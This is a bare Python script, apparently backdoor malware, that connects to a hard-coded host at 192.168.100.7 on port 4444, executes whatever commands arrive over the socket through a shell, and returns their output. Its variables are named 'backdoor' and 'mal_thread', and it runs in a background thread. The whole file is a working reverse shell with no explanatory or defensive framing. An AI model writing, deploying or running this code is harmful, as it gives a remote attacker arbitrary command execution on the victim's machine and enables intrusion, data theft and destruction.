
import threading
import socket
import subprocess

def main():
    server_ip ='192.168.100.7'
    port = 4444

    backdoor = socket.socket()
    backdoor.connect((server_ip, port))

    while True:
        command = backdoor.recv(1024)
        command = command.decode()
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        backdoor.send(output + output_error)

mal_thread = threading.Thread(target=main)
mal_thread.start()

